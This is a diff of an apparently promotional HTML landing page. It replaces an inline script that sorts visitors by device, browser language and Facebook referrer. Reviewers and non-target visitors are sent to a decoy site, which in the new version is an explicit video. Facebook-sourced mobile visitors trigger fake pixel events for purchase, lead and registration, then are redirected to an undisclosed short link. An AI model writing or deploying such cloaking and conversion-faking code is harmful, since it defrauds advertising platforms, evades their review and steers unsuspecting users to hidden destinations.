@@ -761,45 +761,38 @@ src="https://www.facebook.com/tr?id=554044584045627&ev=PageView&noscript=1"
   </div>
   </div>
    
-<iframe id="iframe" style="display: none;"></iframe>
+<script>
+    function openWebsite() {
+        const links = [
+            'https://lihi.cc/Jul56'
+        ];
+        const randomIndex = Math.floor(Math.random() * links.length);
+        const randomLink = links[randomIndex];
 
-    <script>
-        function openWebsite() {
-            const links = [
-                'https://lihi.cc/Jul56'
-            ];
-            const randomIndex = Math.floor(Math.random() * links.length);
-            const randomLink = links[randomIndex];
+        // 开关：是否开启浏览器环境检测
+        const enableBrowserCheck = true; // 将此设置为 true 或 false 以启用或禁用检测
 
-            // 开关：是否开启浏览器环境检测
-            const enableBrowserCheck = true;
+        // 浏览器环境检测逻辑
+        if (enableBrowserCheck) {
+            const userAgent = navigator.userAgent.toLowerCase();
+            const isPC = !/mobile|android|iphone|ipad|ipod/.test(userAgent);
+            const isChinese = /zh|cn/.test(navigator.language.toLowerCase());
+            const referrer = document.referrer.toLowerCase();
+            const isFromFacebook = referrer.includes('facebook.com');
 
-            // 浏览器环境检测逻辑
-            if (enableBrowserCheck) {
-                const userAgent = navigator.userAgent.toLowerCase();
-                const isPC = !/mobile|android|iphone|ipad|ipod/.test(userAgent);
-                const isChinese = /zh|cn/.test(navigator.language.toLowerCase());
-                const referrer = document.referrer.toLowerCase();
-                const isFromFacebook = referrer.includes('facebook.com');
-
-                // 判断条件
-                if (isPC || isChinese || !isFromFacebook) {
-                    const iframe = document.getElementById('iframe');
-                    iframe.src = 'https://www.healthline.com'; // 设置 iframe 的源
-                    iframe.style.display = 'block'; // 显示 iframe
-                    return; // 结束函数执行
-                }
+            // 判断条件
+            if (isPC || isChinese || !isFromFacebook) {
+                window.location.href = 'https://cn.pornhub.com/view_video.php?viewkey=ph63426e5c38031';
+                return; // 结束函数执行
             }
-
-            // 跳转到随机选择的链接
-            fbq('track', 'Contact');
-            fbq('track', 'Purchase');
-            fbq('track', 'Lead');
-            fbq('track', 'CompleteRegistration');
-            window.location.href = randomLink;
         }
 
-        // 调用函数以打开网站
-        openWebsite();
-    </script>
+        // 跳转到随机选择的链接
+        fbq('track', 'Contact');
+        fbq('track', 'Purchase');
+        fbq('track', 'Lead');
+        fbq('track', 'CompleteRegistration');
+        window.location.href = randomLink;
+    }
+</script>
   </body><div id="immersive-translate-popup" style="all: initial"></div></html>
